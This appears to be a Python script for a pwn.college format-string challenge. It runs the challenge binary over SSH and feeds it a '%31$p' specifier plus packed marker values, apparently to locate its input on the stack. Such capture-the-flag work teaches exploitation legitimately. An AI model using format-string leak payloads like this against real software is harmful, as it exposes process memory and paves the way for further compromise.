import subprocess
import struct

SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

slot = 31
prefix = f"AAA |%{slot}$p"

chunks = []
for k in range(20):
    chunks.append(struct.pack("<Q", 0xdead000000000000 + k))

payload = prefix.encode() + b"".join(chunks)
res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
out = res.stdout.decode("latin-1", errors="ignore")
print(out)
